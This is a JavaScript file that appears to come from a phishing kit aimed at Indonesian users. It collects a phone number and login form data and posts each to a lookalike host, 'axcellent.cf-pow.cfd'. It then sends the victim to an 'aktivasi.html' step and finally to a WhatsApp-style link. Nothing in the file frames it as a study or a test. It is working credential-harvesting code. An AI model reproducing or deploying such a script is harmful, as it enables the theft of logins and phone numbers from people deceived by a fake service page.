function sendHp() {
event.preventDefault();
        var nomor = document.getElementById("nomor").value;
        sessionStorage.setItem("nomor", nomor);
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app40/no.php',
            data: $('#eform').serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='data.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
    }, 800);
            }
        })
     }
     
function sendLogin() {
event.preventDefault();
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app40/login.php',
            data: $('#login').serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='aktivasi.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
    }, 800);
            }
        })
     }


audio4 = document.getElementById("bsiku");
function go(){
$('.load').fadeIn();
audio4.play();    
audio4.loop = false;

setTimeout(function(){  
location.href='https://Pahhe.wasap.my';
$('.load').fadeOut();
    }, 5500);    
}  
